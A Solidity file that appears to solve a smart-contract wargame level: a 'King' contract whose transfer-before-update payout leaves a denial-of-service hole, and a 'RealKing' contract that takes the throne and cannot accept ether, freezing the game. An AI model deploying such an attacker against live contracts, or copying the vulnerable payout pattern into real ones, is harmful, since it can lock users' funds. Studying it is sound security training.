// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract RealKing {
    function claimKing(address payable king) external payable {
        require(msg.value == King(king).prize(), "Ether not enough");
        (bool success, ) = king.call{value: msg.value}("");
        require(success, "failed");
        require(King(king)._king() == address(this), "Claim failed");
    }
}